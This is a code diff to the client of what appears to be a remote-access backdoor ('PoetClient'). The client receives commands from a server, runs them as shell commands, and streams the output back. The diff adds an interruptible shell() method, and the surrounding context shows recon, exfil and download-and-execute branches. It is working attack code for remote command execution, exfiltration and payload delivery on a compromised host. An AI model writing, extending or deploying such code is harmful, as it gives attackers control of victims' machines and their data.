@@ -8,6 +8,7 @@ import time
 import zlib
 import base64
 import random
+import select
 import socket
 import struct
 import os.path
@@ -99,6 +100,9 @@ class PoetClient(object):
 
     Receives commands from server, does bidding, responds.
 
+    Note: In any function with `inp' as a parameter, `inp' refers to the
+    command string sent from the server.
+
     Attributes:
         host: server ip address
         port: server port
@@ -124,14 +128,7 @@ class PoetClient(object):
                 elif inp == 'recon':
                     s.send(zlib.compress(self.recon()))
                 elif inp.startswith('shell '):
-                    child_stdout = sp.Popen(inp[6:], stdout=sp.PIPE,
-                                            stderr=sp.STDOUT, shell=True).stdout
-                    while True:
-                        output = child_stdout.readline()
-                        if output:
-                            s.send(output)
-                        else:
-                            break
+                    self.shell(inp, s)
                     s.send('shelldone')
                 elif inp.startswith('exfil '):
                     try:
@@ -210,6 +207,32 @@ class PoetClient(object):
             f.write(r.read())
             os.fchmod(f.fileno(), stat.S_IRWXU)
         sp.Popen(tmp, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
+
+    def shell(self, inp, s):
+        """Psh `shell' command client-side.
+
+        Create a subprocess for command and line buffer command output to
+        server while listening for signals from server.
+
+        Args:
+            s: PoetSocketClient instance
+        """
+
+        proc = sp.Popen(inp[6:], stdout=sp.PIPE, stderr=sp.STDOUT, shell=True)
+        while True:
+            readable = select.select([proc.stdout, s.s], [], [], 30)[0]
+            for fd in readable:
+                if fd == proc.stdout:  # proc has stdout/err to send
+                    output = proc.stdout.readline()
+                    if output:
+                        s.send(output)
+                    else:
+                        return
+                elif fd == s.s:  # remote signal from server
+                    sig = s.recv()
+                    if sig == 'shellterm':
+                        proc.terminate()
+                        return
 
     def cmd_exec(self, cmd):
         """Light wrapper over subprocess.Popen()."""
